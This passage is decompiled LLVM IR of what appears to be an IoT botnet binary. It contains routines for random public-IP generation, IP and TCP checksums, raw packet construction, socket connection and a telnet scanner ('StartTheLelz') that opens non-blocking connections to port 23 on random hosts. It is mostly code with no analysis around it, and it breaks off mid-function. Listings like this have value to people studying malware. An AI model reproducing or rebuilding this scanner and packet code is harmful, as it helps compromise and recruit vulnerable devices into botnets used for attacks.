  %v2_acd0 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* %stack_var_-40, align 4
  %v3_ad18 = load i8, i8* @global_var_27934.74, align 1
  %v4_ad18 = zext i8 %v3_ad18 to i32
  store i32 %v4_ad18, i32* @r4, align 4
  %v3_ad24 = load i8, i8* @global_var_27935.75, align 1
  %v6_ad4c = sext i8 %v3_ad18 to i32
  %v8_ad4c = sext i8 %v3_ad24 to i32
  %v10_ad4c = sext i8 %v2_a95c.sink.off0 to i32
  %v11_ad4c = call i32 @szprintf(i32 %v2_acd0, i32 ptrtoint ([12 x i8]* @global_var_1cbb8.78 to i32), i32 %v3_aab4, i32 %v6_ad4c, i32 %v8_ad4c, i32 %v10_ad4c)
  store i32 %v2_acd0, i32* @r0, align 4
  %v1_ad58 = call i32 @inet_addr(i32 %v2_acd0)
  store i32 %v3_a830, i32* @r4, align 4
  store i32 %v6_a830, i32* @fp, align 4
  store i32 %v13_a830, i32* @lr, align 4
  ret i32 %v1_ad58

; uselistorder directives
  uselistorder i32 %v2_acd0, { 2, 1, 0 }
  uselistorder i32 %v0_aa18, { 1, 0 }
  uselistorder i32 %v0_a9cc, { 1, 0 }
  uselistorder i32 %v0_a978, { 1, 0 }
  uselistorder i32 %v0_a8dc, { 1, 0 }
  uselistorder i32 %v0_a890, { 1, 0 }
  uselistorder i32 %v0_a83c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* @global_var_27935.75, { 2, 1, 0 }
  uselistorder i8* @global_var_27934.74, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_27933.72 to i8*), { 2, 0, 1 }
  uselistorder label %dec_label_pc_abf0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_abc0, { 1, 0 }
  uselistorder label %dec_label_pc_aba0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab70, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ab40, { 1, 0 }
  uselistorder label %dec_label_pc_aab0, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_ad84 = load i32, i32* @fp, align 4
  %v2_ad98 = load i32, i32* @global_var_2db7c.80, align 4
  %v1_ada0 = call i32 @__GI_ntohl(i32 %v2_ad98)
  %v2_adac = and i32 %v1_ada0, %arg1
  %v0_adb4 = call i32 @rand_cmwc()
  %v1_adc0 = sub i32 -1, %arg1
  %v2_adc4 = and i32 %v0_adb4, %v1_adc0
  %v2_adcc = xor i32 %v2_adc4, %v2_adac
  store i32 %v3_ad84, i32* @fp, align 4
  ret i32 %v2_adcc
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_ae589 = icmp sgt i32 %arg2, 1
  br i1 %v8_ae589, label %dec_label_pc_ae10, label %dec_label_pc_ae5c

dec_label_pc_ae10:                                ; preds = %entry, %dec_label_pc_ae10
  %v2_ae24 = phi i32 [ %v2_ae28, %dec_label_pc_ae10 ], [ 0, %entry ]
  %stack_var_-44.012 = phi i32 [ %v5_ae2c, %dec_label_pc_ae10 ], [ 0, %entry ]
  %stack_var_-40.011 = phi i32 [ %v1_ae48, %dec_label_pc_ae10 ], [ %arg2, %entry ]
  %stack_var_-36.010 = phi i16* [ %v5_ae40, %dec_label_pc_ae10 ], [ %arg1, %entry ]
  %v4_ae10 = ptrtoint i16* %stack_var_-36.010 to i32
  %v2_ae14 = load i16, i16* %stack_var_-36.010, align 2
  %v3_ae14 = zext i16 %v2_ae14 to i32
  %v2_ae28 = add i32 %v3_ae14, %v2_ae24
  %v3_ae28 = icmp ult i32 %v2_ae28, %v2_ae24
  %v4_ae2c = zext i1 %v3_ae28 to i32
  %v5_ae2c = add i32 %v4_ae2c, %stack_var_-44.012
  %v1_ae3c = add i32 %v4_ae10, 2
  %v5_ae40 = inttoptr i32 %v1_ae3c to i16*
  %v1_ae48 = add nsw i32 %stack_var_-40.011, -2
  %v8_ae58 = icmp sgt i32 %v1_ae48, 1
  br i1 %v8_ae58, label %dec_label_pc_ae10, label %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge

dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge:    ; preds = %dec_label_pc_ae10
  br label %dec_label_pc_ae5c

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge, %entry
  %v2_ae7c = phi i32 [ %v2_ae28, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ 0, %entry ]
  %stack_var_-36.0.lcssa = phi i16* [ %v5_ae40, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ %arg1, %entry ]
  %stack_var_-44.0.lcssa = phi i32 [ %v5_ae2c, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ 0, %entry ]
  %v7_ae54.lcssa.in = phi i32 [ %v1_ae48, %dec_label_pc_ae50.dec_label_pc_ae5c_crit_edge ], [ %arg2, %entry ]
  %v7_ae54.lcssa = icmp eq i32 %v7_ae54.lcssa.in, 1
  br i1 %v7_ae54.lcssa, label %dec_label_pc_ae68, label %dec_label_pc_aee4.preheader

dec_label_pc_ae68:                                ; preds = %dec_label_pc_ae5c
  %v1_ae6c = bitcast i16* %stack_var_-36.0.lcssa to i8*
  %v2_ae6c = load i8, i8* %v1_ae6c, align 1
  %v3_ae6c = zext i8 %v2_ae6c to i32
  %v2_ae80 = add i32 %v3_ae6c, %v2_ae7c
  %v3_ae80 = icmp ult i32 %v2_ae80, %v2_ae7c
  %v4_ae84 = zext i1 %v3_ae80 to i32
  %v5_ae84 = add i32 %v4_ae84, %stack_var_-44.0.lcssa
  br label %dec_label_pc_aee4.preheader

dec_label_pc_aee4.preheader:                      ; preds = %dec_label_pc_ae68, %dec_label_pc_ae5c
  %v3_af10.ph = phi i32 [ %v2_ae7c, %dec_label_pc_ae5c ], [ %v2_ae80, %dec_label_pc_ae68 ]
  %stack_var_-44.1.ph = phi i32 [ %stack_var_-44.0.lcssa, %dec_label_pc_ae5c ], [ %v5_ae84, %dec_label_pc_ae68 ]
  %v3_aee837 = mul i32 %stack_var_-44.1.ph, 65536
  %v3_aef038 = udiv i32 %v3_af10.ph, 65536
  %v2_aef439 = or i32 %v3_aee837, %v3_aef038
  %v3_aefc40 = udiv i32 %stack_var_-44.1.ph, 65536
  %v2_af0441 = or i32 %v2_aef439, %v3_aefc40
  %v2_af0842 = icmp eq i32 %v2_af0441, 0
  br i1 %v2_af0842, label %dec_label_pc_af10, label %dec_label_pc_ae94

dec_label_pc_ae94:                                ; preds = %dec_label_pc_aee4.preheader, %dec_label_pc_ae94
  %v3_aefc45 = phi i32 [ %v3_aefc, %dec_label_pc_ae94 ], [ %v3_aefc40, %dec_label_pc_aee4.preheader ]
  %v2_aef444 = phi i32 [ %v2_aef4, %dec_label_pc_ae94 ], [ %v2_aef439, %dec_label_pc_aee4.preheader ]
  %v3_af1043 = phi i32 [ %v2_aed4, %dec_label_pc_ae94 ], [ %v3_af10.ph, %dec_label_pc_aee4.preheader ]
  %v2_aea8 = urem i32 %v3_af1043, 65536
  %v2_aed4 = add i32 %v2_aef444, %v2_aea8
  %v3_aed4 = icmp ult i32 %v2_aed4, %v2_aea8
  %v4_aed8 = zext i1 %v3_aed4 to i32
  %v5_aed8 = add nuw nsw i32 %v4_aed8, %v3_aefc45
  %v3_aee8 = mul i32 %v5_aed8, 65536
  %v3_aef0 = udiv i32 %v2_aed4, 65536
  %v2_aef4 = or i32 %v3_aee8, %v3_aef0
  %v3_aefc = udiv i32 %v5_aed8, 65536
  %v2_af04 = or i32 %v2_aef4, %v3_aefc
  %v2_af08 = icmp eq i32 %v2_af04, 0
  br i1 %v2_af08, label %dec_label_pc_aee4.dec_label_pc_af10_crit_edge, label %dec_label_pc_ae94

dec_label_pc_aee4.dec_label_pc_af10_crit_edge:    ; preds = %dec_label_pc_ae94
  br label %dec_label_pc_af10

dec_label_pc_af10:                                ; preds = %dec_label_pc_aee4.dec_label_pc_af10_crit_edge, %dec_label_pc_aee4.preheader
  %v3_af10.lcssa = phi i32 [ %v2_aed4, %dec_label_pc_aee4.dec_label_pc_af10_crit_edge ], [ %v3_af10.ph, %dec_label_pc_aee4.preheader ]
  %v1_af1c = urem i32 %v3_af10.lcssa, 65536
  %v3_af24 = xor i32 %v1_af1c, 65535
  ret i32 %v3_af24

; uselistorder directives
  uselistorder i32 %v2_aef4, { 1, 0 }
  uselistorder i32 %v5_aed8, { 1, 0 }
  uselistorder i32 %v2_aed4, { 2, 0, 3, 1 }
  uselistorder i32 %v3_aefc40, { 1, 0 }
  uselistorder i32 %stack_var_-44.1.ph, { 1, 0 }
  uselistorder i32 %v3_af10.ph, { 2, 1, 0 }
  uselistorder i32 %v2_ae7c, { 0, 2, 1 }
  uselistorder i32 %v1_ae48, { 0, 2, 1 }
  uselistorder i32 %v2_ae28, { 0, 2, 1 }
  uselistorder i32 %v2_ae24, { 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ae94, { 1, 0 }
  uselistorder label %dec_label_pc_ae10, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_af3c = load i32, i32* @fp, align 4
  store i32 44868, i32* %stack_var_-4, align 4
  %v2_af40 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_af40, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %v1_af60 = add i32 %arg1, 12
  %v2_af60 = inttoptr i32 %v1_af60 to i32*
  %v3_af60 = load i32, i32* %v2_af60, align 4
  store i32 %v3_af60, i32* %stack_var_-44, align 4
  %v1_af88 = call i32 @__GI_htons(i32 20)
  %v1_afa4 = call i32 @malloc(i32 32)
  %v2_afb0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_afb0, i32* @r3, align 4
  store i32 %v1_afa4, i32* @r0, align 4
  store i32 %v2_afb0, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_afc0 = call i32 @memcpy()
  %v1_afc8 = add i32 %v1_afa4, 12
  store i32 %v1_afc8, i32* @r3, align 4
  store i32 %v1_afc8, i32* @r0, align 4
  %v3_afd0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_afd0, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_afd8 = call i32 @memcpy()
  %v2_afe4 = inttoptr i32 %v1_afa4 to i16*
  %v3_afe4 = call i32 @csum(i16* %v2_afe4, i32 32)
  %sext = mul i32 %v3_afe4, 65536
  %v1_afe8 = sdiv i32 %sext, 65536
  store i32 %v1_afa4, i32* @r0, align 4
  %v0_aff4 = call i32 @free()
  %v4_aff8 = urem i32 %v1_afe8, 65536
  store i32 %v3_af3c, i32* @fp, align 4
  ret i32 %v4_aff8

; uselistorder directives
  uselistorder i32 %v1_afa4, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg4 to i8
  %tmp3 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_b010 = load i32, i32* @fp, align 4
  store i8 69, i8* %arg1, align 1
  %v3_b07c = add i32 %tmp3, 1
  %v4_b07c = inttoptr i32 %v3_b07c to i8*
  store i8 0, i8* %v4_b07c, align 1
  %v3_b080 = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_b080, 20
  %v1_b09c = trunc i32 %fold to i16
  %v3_b09c = add i32 %tmp3, 2
  %v4_b09c = inttoptr i32 %v3_b09c to i16*
  store i16 %v1_b09c, i16* %v4_b09c, align 2
  %v0_b0a0 = call i32 @rand_cmwc()
  %v1_b0b4 = trunc i32 %v0_b0a0 to i16
  %v3_b0b4 = add i32 %tmp3, 4
  %v4_b0b4 = inttoptr i32 %v3_b0b4 to i16*
  store i16 %v1_b0b4, i16* %v4_b0b4, align 2
  %v3_b0c0 = add i32 %tmp3, 6
  %v4_b0c0 = inttoptr i32 %v3_b0c0 to i16*
  store i16 0, i16* %v4_b0c0, align 2
  %v3_b0cc = add i32 %tmp3, 8
  %v4_b0cc = inttoptr i32 %v3_b0cc to i8*
  store i8 -1, i8* %v4_b0cc, align 1
  %v3_b0d8 = add i32 %tmp3, 9
  %v4_b0d8 = inttoptr i32 %v3_b0d8 to i8*
  store i8 %tmp, i8* %v4_b0d8, align 1
  %v3_b0e4 = add i32 %tmp3, 10
  %v4_b0e4 = inttoptr i32 %v3_b0e4 to i16*
  store i16 0, i16* %v4_b0e4, align 2
  %v2_b0f0 = add i32 %tmp3, 12
  %v3_b0f0 = inttoptr i32 %v2_b0f0 to i32*
  store i32 %arg3, i32* %v3_b0f0, align 4
  %v2_b0fc = add i32 %tmp3, 16
  %v3_b0fc = inttoptr i32 %v2_b0fc to i32*
  store i32 %arg2, i32* %v3_b0fc, align 4
  store i32 %v3_b010, i32* @fp, align 4
  ret i32 %v0_b0a0

; uselistorder directives
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_b128 = icmp sgt i32 %arg1, 2
  br i1 %v8_b128, label %dec_label_pc_b138, label %dec_label_pc_b148

dec_label_pc_b138:                                ; preds = %entry
  %v1_b13c = call i32 @__GI_close(i32 %arg1)
  br label %dec_label_pc_b148

dec_label_pc_b148:                                ; preds = %entry, %dec_label_pc_b138
  %storemerge1 = phi i32 [ 0, %dec_label_pc_b138 ], [ 1, %entry ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder label %dec_label_pc_b148, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_b160 = load i32, i32* @fp, align 4
  store i32 45416, i32* %stack_var_-4, align 4
  %v2_b164 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b164, i32* @fp, align 4
  store i32 1, i32* %stack_var_-44, align 4
  store i32 %arg1, i32* @r0, align 4
  %v1_b184 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_b194 = icmp eq i32 %v1_b184, 0
  br i1 %v2_b194, label %dec_label_pc_b19c, label %dec_label_pc_b1a8

dec_label_pc_b19c:                                ; preds = %entry
  br label %dec_label_pc_b274

dec_label_pc_b1a8:                                ; preds = %entry
  %tmp = sext i16 %arg2 to i32
  %v1_b1ac = add i32 %v1_b184, 16
  %v2_b1ac = inttoptr i32 %v1_b1ac to i32*
  %v3_b1ac = load i32, i32* %v2_b1ac, align 4
  %v1_b1b0 = inttoptr i32 %v3_b1ac to i32*
  %v2_b1b0 = load i32, i32* %v1_b1b0, align 4
  %v1_b1b8 = add i32 %v1_b184, 12
  %v2_b1b8 = inttoptr i32 %v1_b1b8 to i32*
  %v3_b1b8 = load i32, i32* %v2_b1b8, align 4
  store i32 %v3_b1b8, i32* @r2, align 4
  %v2_b1c4 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_b1c4, i32* @r3, align 4
  %v5_b1d0 = call i32 @bcopy(i32 %v2_b1b0, i32 %v2_b1c4, i32 %v3_b1b8, i32 %v2_b1c4, i32 %v1_b184)
  %v2_b1dc = call i32 @__GI_htons(i32 %tmp)
  store i32 2, i32* %stack_var_-40, align 4
  %v3_b1fc = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_b208 = ptrtoint i32* %stack_var_-44 to i32
  %v5_b224 = call i32 @__GI_setsockopt(i32 %v3_b1fc, i32 6, i32 1, i32 %v2_b208, i32 4)
  %v3_b22c = icmp eq i32 %v3_b1fc, -1
  br i1 %v3_b22c, label %dec_label_pc_b234, label %dec_label_pc_b240

dec_label_pc_b234:                                ; preds = %dec_label_pc_b1a8
  br label %dec_label_pc_b274

dec_label_pc_b240:                                ; preds = %dec_label_pc_b1a8
  %v2_b1c0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_b250 = call i32 @__libc_connect(i32 %v3_b1fc, i32 %v2_b1c0, i32 16)
  %v3_b258 = icmp eq i32 %v3_b250, -1
  br i1 %v3_b258, label %dec_label_pc_b260, label %dec_label_pc_b26c

dec_label_pc_b260:                                ; preds = %dec_label_pc_b240
  br label %dec_label_pc_b274

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b240
  br label %dec_label_pc_b274

dec_label_pc_b274:                                ; preds = %dec_label_pc_b260, %dec_label_pc_b234, %dec_label_pc_b19c, %dec_label_pc_b26c
  %stack_var_-60.0 = phi i32 [ 0, %dec_label_pc_b19c ], [ 0, %dec_label_pc_b234 ], [ 0, %dec_label_pc_b260 ], [ %v3_b1fc, %dec_label_pc_b26c ]
  store i32 %v3_b160, i32* @fp, align 4
  ret i32 %stack_var_-60.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder label %dec_label_pc_b274, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-340 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-612 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_b288 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_b288, i32* %ip.global-to-local, align 4
  %v3_b28c = load i32, i32* @r4, align 4
  store i32 %v3_b28c, i32* %stack_var_-24, align 4
  store i32 45716, i32* %stack_var_-4, align 4
  %v19_b28c = ptrtoint i32* %stack_var_-24 to i32
  %v2_b290 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_b290, i32* @fp, align 4
  %v2_b2ac = call i32 @__GI_time(i32* null)
  store i32 %v2_b2ac, i32* @r4, align 4
  %v0_b2b8 = call i32 @rand_cmwc()
  %v0_b2c0 = load i32, i32* @r4, align 4
  %v2_b2c0 = xor i32 %v0_b2c0, %v0_b2b8
  %v1_b2c8 = call i32 @srand(i32 %v2_b2c0)
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b2e4 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v2_b314 = bitcast i32* %stack_var_-604 to i8*
  %v3_b314 = call i32 @__GI_memset(i8* %v2_b314, i32 0)
  %v1_b320 = call i32 @malloc(i32 1025)
  store i32 1025, i32* @r2, align 4
  %v2_b33c = inttoptr i32 %v1_b320 to i8*
  %v3_b33c = call i32 @__GI_memset(i8* %v2_b33c, i32 0)
  %v2_b34c = mul i32 %arg2, 28
  %v1_b354 = add i32 %v2_b34c, 14
  %v3_b358 = and i32 %v1_b354, -8
  %v1_b360 = load i32, i32* @sp, align 4
  %v2_b360 = sub i32 %v1_b360, %v3_b358
  %v1_b370 = add i32 %v2_b360, 15
  %v3_b374 = and i32 %v1_b370, -8
  %v2_b398 = mul i32 %arg2, 5
  store i32 %v2_b398, i32* @r2, align 4
  %v2_b3a8 = inttoptr i32 %v3_b374 to i8*
  %v3_b3a8 = call i32 @__GI_memset(i8* %v2_b3a8, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  %v5_b44856 = icmp sgt i32 %arg2, 0
  br i1 %v5_b44856, label %dec_label_pc_b3b8, label %dec_label_pc_b44c

dec_label_pc_b3b8:                                ; preds = %entry, %dec_label_pc_b3b8
  %storemerge457 = phi i32 [ %v1_b434, %dec_label_pc_b3b8 ], [ 0, %entry ]
  %v2_b3c8 = mul i32 %storemerge457, 28
  %v2_b3cc = add i32 %v2_b3c8, %v3_b374
  store i32 28, i32* @r2, align 4
  %v2_b3dc = inttoptr i32 %v2_b3cc to i8*
  %v3_b3dc = call i32 @__GI_memset(i8* %v2_b3dc, i32 0)
  %v3_b404 = add i32 %v2_b3cc, 9
  %v4_b404 = inttoptr i32 %v3_b404 to i8*
  store i8 1, i8* %v4_b404, align 1
  %v2_b424 = add i32 %v2_b3cc, 24
  %v2_b42c = inttoptr i32 %v2_b424 to i32*
  store i32 %v1_b320, i32* %v2_b42c, align 4
  %v1_b434 = add nuw nsw i32 %storemerge457, 1
  store i32 %v1_b434, i32* %r2.global-to-local, align 4
  %v5_b448 = icmp slt i32 %v1_b434, %arg2
  br i1 %v5_b448, label %dec_label_pc_b3b8, label %dec_label_pc_b44c

dec_label_pc_b44c:                                ; preds = %dec_label_pc_b3b8, %entry
  br label %dec_label_pc_b454

dec_label_pc_b454:                                ; preds = %dec_label_pc_b454, %dec_label_pc_b44c
  %stack_var_-56.0 = phi i32 [ 0, %dec_label_pc_b44c ], [ %v1_b458, %dec_label_pc_b454 ]
  %v1_b458 = add i32 %stack_var_-56.0, 1
  store i32 %v1_b458, i32* %r2.global-to-local, align 4
  %v4_b468 = mul i32 %v1_b458, 4
  %v5_b468 = add i32 %v4_b468, ptrtoint ([10 x i8*]* @global_var_275f4.92 to i32)
  %v6_b468 = inttoptr i32 %v5_b468 to i32*
  %v7_b468 = load i32, i32* %v6_b468, align 4
  %v2_b46c = icmp eq i32 %v7_b468, 0
  br i1 %v2_b46c, label %dec_label_pc_b474.preheader, label %dec_label_pc_b454

dec_label_pc_b474.preheader:                      ; preds = %dec_label_pc_b454
  %v2_b4fc = add i32 %v3_b374, 8
  %v2_b74c = or i32 %v3_b374, 4
  %v2_b82c = ptrtoint i32* %stack_var_-612 to i32
  %v2_b8ac = ptrtoint i32* %stack_var_-324 to i32
  %v2_b9a8 = ptrtoint i32* %stack_var_-332 to i32
  %v2_ba04 = ptrtoint i32* %stack_var_-340 to i32
  %v2_ba08 = ptrtoint i32* %stack_var_-336 to i32
  %v2_bb24 = add i32 %v3_b374, 16
  %v2_bba0 = add i32 %v3_b374, 24
  br label %dec_label_pc_b474

dec_label_pc_b474:                                ; preds = %dec_label_pc_b474, %dec_label_pc_c520, %dec_label_pc_b474.preheader
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v5_b44856, label %dec_label_pc_b480, label %dec_label_pc_b474

dec_label_pc_b480:                                ; preds = %dec_label_pc_b474, %dec_label_pc_c520
  %storemerge548 = phi i32 [ %v1_c524, %dec_label_pc_c520 ], [ 0, %dec_label_pc_b474 ]
  %v3_b48c = mul i32 %storemerge548, 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b494 = mul i32 %storemerge548, 28
  %v2_b498 = add i32 %v2_b494, %v3_b374
  %v2_b49c = add i32 %v2_b498, 16
  %v1_b4a0 = inttoptr i32 %v2_b49c to i32*
  %v2_b4a0 = load i32, i32* %v1_b4a0, align 4
  %v2_b4a4 = icmp eq i32 %v2_b4a0, 0
  br i1 %v2_b4a4, label %dec_label_pc_b4ac, label %dec_label_pc_b4e4

dec_label_pc_b4ac:                                ; preds = %dec_label_pc_b480
  store i32 %storemerge548, i32* @r4, align 4
  %v2_b4b4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  %v3_b4cc = mul i32 %v0_b4c8, 4
  store i32 %v3_b4cc, i32* %r2.global-to-local, align 4
  %v2_b4d4 = mul i32 %v0_b4c8, 28
  %v2_b4dc = add i32 %v2_bb24, %v2_b4d4
  %v2_b4e0 = inttoptr i32 %v2_b4dc to i32*
  store i32 %v2_b4b4, i32* %v2_b4e0, align 4
  br label %dec_label_pc_b4e4

dec_label_pc_b4e4:                                ; preds = %dec_label_pc_b480, %dec_label_pc_b4ac
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b500 = add i32 %v2_b4fc, %v2_b494
  %v1_b504 = inttoptr i32 %v2_b500 to i8*
  %v2_b504 = load i8, i8* %v1_b504, align 4
  %v3_b504 = sext i8 %v2_b504 to i32
  switch i32 %v3_b504, label %dec_label_pc_c520 [
    i32 0, label %dec_label_pc_b534
    i32 1, label %dec_label_pc_b8c0.lr.ph
    i32 2, label %dec_label_pc_bb6c
    i32 3, label %dec_label_pc_bcb8
    i32 4, label %dec_label_pc_be0c
    i32 5, label %dec_label_pc_bf58
    i32 6, label %dec_label_pc_c0ac
    i32 7, label %dec_label_pc_c3b0
  ]

dec_label_pc_b534:                                ; preds = %dec_label_pc_b4e4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b550 = add i32 %v2_b498, 8
  %v1_b554 = add i32 %v2_b498, 9
  %v2_b554 = inttoptr i32 %v1_b554 to i8*
  %v3_b554 = load i8, i8* %v2_b554, align 1
  %v7_b558 = icmp eq i8 %v3_b554, 1
  br i1 %v7_b558, label %dec_label_pc_b560, label %dec_label_pc_b60c

dec_label_pc_b560:                                ; preds = %dec_label_pc_b534
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b57c = add i32 %v2_b498, 24
  %v1_b580 = inttoptr i32 %v2_b57c to i32*
  %v2_b580 = load i32, i32* %v1_b580, align 4
  store i32 28, i32* @r2, align 4
  %v2_b5ac = inttoptr i32 %v2_b498 to i8*
  %v3_b5ac = call i32 @__GI_memset(i8* %v2_b5ac, i32 0)
  store i32 %v2_b57c, i32* %r2.global-to-local, align 4
  store i32 %v2_b580, i32* %v1_b580, align 4
  store i32 %storemerge548, i32* @r4, align 4
  %v4_b5dc = call i32 @GetRandomPublicIP(i32 24, i32 %v3_b374, i32 %v2_b57c, i32 %v2_b580)
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5ec = load i32, i32* @r4, align 4
  %v3_b5f0 = mul i32 %v0_b5ec, 4
  store i32 %v3_b5f0, i32* %r2.global-to-local, align 4
  %v2_b5f8 = mul i32 %v0_b5ec, 28
  %v2_b600 = add i32 %v2_b74c, %v2_b5f8
  %v2_b604 = inttoptr i32 %v2_b600 to i32*
  store i32 %v4_b5dc, i32* %v2_b604, align 4
  br label %dec_label_pc_b6e8

dec_label_pc_b60c:                                ; preds = %dec_label_pc_b534
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v3_b62c = load i8, i8* %v2_b554, align 1
  %v2_b630 = icmp eq i8 %v3_b62c, 0
  br i1 %v2_b630, label %dec_label_pc_b638, label %dec_label_pc_b6e8

dec_label_pc_b638:                                ; preds = %dec_label_pc_b60c
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b65c = add i32 %v2_b498, 11
  %v2_b65c = inttoptr i32 %v1_b65c to i8*
  %v3_b65c = load i8, i8* %v2_b65c, align 1
  %v1_b660 = add i8 %v3_b65c, 1
  store i8 %v1_b660, i8* %v2_b65c, align 1
  store i32 8, i32* %ip.global-to-local, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b6b4 = add i32 %v2_b498, 10
  %v2_b6b4 = inttoptr i32 %v1_b6b4 to i8*
  %v3_b6b4 = load i8, i8* %v2_b6b4, align 2
  %v1_b6b8 = add i8 %v3_b6b4, 1
  store i32 %v3_b374, i32* %ip.global-to-local, align 4
  store i32 8, i32* @lr, align 4
  store i32 %v2_b550, i32* %r2.global-to-local, align 4
  store i8 %v1_b6b8, i8* %v2_b6b4, align 2
  br label %dec_label_pc_b6e8

dec_label_pc_b6e8:                                ; preds = %dec_label_pc_b60c, %dec_label_pc_b560, %dec_label_pc_b638
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-612, align 4
  %v1_b700 = call i32 @__GI_htons(i32 23)
  store i32 8, i32* @r2, align 4
  %v3_b730 = call i32 @__GI_memset(i8* %v2_b314, i32 0)
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  store i32 %storemerge548, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b76c = call i32 @socket(i32 2, i32 1, i32 0)
  %v0_b774 = load i32, i32* @r4, align 4
  %v2_b780 = mul i32 %v0_b774, 28
  %v2_b784 = add i32 %v2_b780, %v3_b374
  %v2_b788 = inttoptr i32 %v2_b784 to i32*
  store i32 %v3_b76c, i32* %v2_b788, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v1_b7a4 = inttoptr i32 %v2_b498 to i32*
  %v2_b7a4 = load i32, i32* %v1_b7a4, align 4
  %v7_b7a8 = icmp eq i32 %v2_b7a4, -1
  br i1 %v7_b7a8, label %dec_label_pc_c520, label %dec_label_pc_b7b0

dec_label_pc_b7b0:                                ; preds = %dec_label_pc_b6e8
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b7c8 = load i32, i32* %v1_b7a4, align 4
  store i32 %v2_b7c8, i32* @r4, align 4
  store i32 %v3_b48c, i32* %r2.global-to-local, align 4
  %v2_b7e4 = load i32, i32* %v1_b7a4, align 4
  store i32 %v2_b7e4, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_b7f4 = call i32 @__libc_fcntl(i32 %v2_b7e4, i32 3)
  %v1_b7fc = or i32 %v2_b7f4, 2048
  store i32 %v1_b7fc, i32* @r3, align 4
  %v0_b800 = load i32, i32* @r4, align 4
